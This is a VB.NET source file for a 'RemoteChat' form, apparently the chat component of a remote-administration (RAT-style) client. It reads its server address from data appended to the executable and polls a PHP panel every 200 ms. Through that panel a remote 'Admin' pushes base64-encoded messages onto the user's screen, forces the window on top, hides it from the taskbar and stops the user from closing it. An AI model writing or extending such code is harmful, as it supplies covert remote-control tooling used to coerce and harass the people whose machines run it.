Imports System.ComponentModel
Imports System.Dynamic
Imports System.Net
Imports System.Text
Public Class RemoteChat
    Dim preventFormClosing As Boolean = False
    Dim messageList As New List(Of String)

    Private m_MyForm As MainForm
    Public ReadOnly Property MyForm() As MainForm
        Get
            If IsNothing(m_MyForm) Then m_MyForm = New MainForm
            Return m_MyForm
        End Get
    End Property

    Private Sub RemoteChat_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        msgReceiverBW.RunWorkerAsync()
    End Sub

    Private Sub addChatMessage(message As String, Optional isAdmin As Boolean = False)
        '  Console.WriteLine("message added")
        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = "("

        If isAdmin Then
            chatWindow.SelectionColor = Color.Red : chatWindow.SelectedText = "Admin"
        Else
            chatWindow.SelectionColor = Color.Green : chatWindow.SelectedText = "You"
        End If

        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = ") >> " & message & ControlChars.Lf

        messageList.Add(message)
        chatWindow.ScrollToCaret()
        chatWindow.Refresh()
    End Sub

    Private Sub sendButtonClickSub()
        Dim sendMessageQuery = New WebClient().DownloadString(MainForm.EOFArguments(0) &
                             "clients.php?action=clientsend" &
                             "&actioncontent=" & messageTB.Text)

        addChatMessage(messageTB.Text)
        messageTB.Clear()
    End Sub

    Private Sub msgReceiverBW_DoWork(sender As Object, e As DoWorkEventArgs) Handles msgReceiverBW.DoWork
        Dim lastMessageReceived As String = ""

        While True
            Dim receivedMessageQuery = New WebClient().DownloadString(MainForm.EOFArguments(0) & "clients.php?action=clientreceive")

            If receivedMessageQuery = lastMessageReceived Then
                GoTo EndOfTreatement
            Else
                lastMessageReceived = receivedMessageQuery
            End If

            If receivedMessageQuery.Trim = "" Then
                GoTo EndOfTreatement
            End If

            Dim parsedMessage As String() = receivedMessageQuery.Split("|")

            Invoke(Sub() Me.ShowInTaskbar = parsedMessage(0) = "1")
            Invoke(Sub() Me.TopMost = parsedMessage(1) = "1")
            preventFormClosing = parsedMessage(2) = "1"

            Dim decodedMsg As String = Encoding.UTF8.GetString(Convert.FromBase64String(parsedMessage(3)))
            addChatMessage(decodedMsg, True)

EndOfTreatement:
            Threading.Thread.Sleep(200)
        End While
    End Sub

    Private Sub sendButton_Click(sender As Object, e As EventArgs) Handles sendButton.Click
        sendButtonClickSub()
    End Sub

    Private Sub messageTB_TextChanged(sender As Object, e As EventArgs) Handles messageTB.TextChanged
        sendButton.Enabled = messageTB.Text.Trim <> ""
    End Sub

    Private Sub RemoteChat_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        msgReceiverBW.CancelAsync()
        e.Cancel = preventFormClosing
        If preventFormClosing Then MsgBox("You are not allowed to close this window.", MsgBoxStyle.Critical, "")
    End Sub

    Private Sub messageTB_KeyDown(sender As Object, e As KeyEventArgs) Handles messageTB.KeyDown
        If e.KeyCode = Keys.Enter And messageTB.Text.Trim <> "" Then
            e.SuppressKeyPress = True
            sendButtonClickSub()
        End If
    End Sub
End Class